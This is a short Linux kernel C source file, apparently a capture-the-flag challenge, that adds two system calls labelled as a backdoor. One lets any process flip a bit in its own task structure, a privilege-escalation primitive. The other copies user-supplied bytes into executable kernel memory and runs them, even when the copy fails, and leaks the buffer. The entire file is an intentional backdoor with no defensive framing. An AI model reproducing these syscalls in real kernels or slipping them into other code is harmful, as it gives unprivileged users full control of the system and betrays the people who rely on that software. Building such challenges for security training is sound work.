#include <linux/kernel.h>
#include <linux/syscalls.h>

#define __NR_FLIP 555
#define __NR_INJECT 556

unsigned long flips = 0;

SYSCALL_DEFINE2(flip, unsigned long, offset, unsigned char, bit)
{
	if (flips > 0 || offset >= sizeof(struct task_struct) || bit >= 8) {
		printk(KERN_ALERT "[backdoor] No\n");
		return -EPERM;
	}

	((unsigned char *)current)[offset] ^= (1 << (bit));
	flips++;

	return 0;
}

typedef void func(void);

SYSCALL_DEFINE2(inject, void *, addr, unsigned long, len)
{
	void *buf;
	buf = __vmalloc(128, GFP_KERNEL, PAGE_KERNEL_EXEC);
	if (len < 128) {
		if (copy_from_user(buf, addr, len) == 0) {
			printk(KERN_INFO
			       "[backdoor] Copied %lu bytes from userland\n",
			       len);
		}
		((func *)buf)();
	}

	return 0;
}
